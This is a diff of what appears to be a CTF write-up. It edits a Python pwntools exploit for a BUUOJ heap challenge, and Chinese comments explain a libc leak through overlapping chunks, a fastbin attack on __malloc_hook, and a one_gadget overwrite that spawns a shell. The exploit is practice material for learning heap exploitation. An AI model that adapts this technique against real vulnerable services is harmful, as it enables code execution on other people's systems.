@@ -204,28 +204,22 @@ int __fastcall Dump(__int64 a1)
 
 ```python
 from pwn import *
-
 context.log_level = 'debug'
 p=remote("node4.buuoj.cn",29543)
-
 def add(size):
     p.sendlineafter('Command: ','1')
     p.sendlineafter('Size: ',str(size))
-
 def edit(idx,content):
     p.sendlineafter('Command: ','2')
     p.sendlineafter('Index: ',str(idx))
     p.sendlineafter('Size: ',str(len(content)))
     p.sendlineafter('Content: ',content)
-
 def delete(idx):
     p.sendlineafter('Command: ','3')
     p.sendlineafter('Index: ',str(idx))
-
 def show(idx):
     p.sendlineafter('Command: ','4')
     p.sendlineafter('Index: ',str(idx))
-
 #---------------这3个一组，是为了泄漏libc地址----------#
 add(0x10)#0
 add(0x10)#1
@@ -234,7 +228,6 @@ add(0x80)#2
 add(0x30)#3
 add(0x68)#4
 add(0x10)#5
-
 #------------------泄漏libc地址------------------------------------#
 edit(0,p64(0)*3+p64(0xb1))#通过edit(0)来改变chunk1的大小，使其包裹chunk2
 delete(1)
@@ -244,17 +237,14 @@ delete(2)  #使得chunk2进入unsorted bin。free后chunk2的fd和bk就变成了
 show(1)     #那么我们打印chunk1的内容就能泄漏chunk2的fd
 libc_base = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')) -0x3c4b78
 malloc_hook =  libc_base + 3951376
-
 #-----------------fastbin attack-------------------------------------#
 delete(4)#释放使其进入fastbin
 edit(3,p64(0)*7+p64(0x71)+p64(malloc_hook-0x23)) #通过堆块3的溢出修改已经被free的堆块4的fd指针为malloc_hook-0x23。这里算是个公式了，分配到这里才能通过错位构造出0x7f的size域。
-add(0x68)#2    #fasbin attack。大佬这里标得到的是2好号堆块我不太懂，刚刚delete的是4号，那这个应该是4号，况且2号堆块不是在unsorted bin里吗？
+add(0x68)#2    #fastbin attack。大佬这里标的是2号堆块我不太懂，刚刚delete的是4号，那这个应该是4号，况且2号堆块不是在unsorted bin里吗？
 add(0x68)#4    #这个堆块就分配到__malloc_hook周围了，下面编辑为one_gadget
 one = [0xf1147,0xf02a4,0x4526a,0x45216]
 one_gadget = libc_base + one[2]
 edit(4,b'\x00'*0x13+p64(one_gadget)) #覆盖malloc_hook为one_gadget
-
 add(0x10)
-
 p.interactive() 
 ```
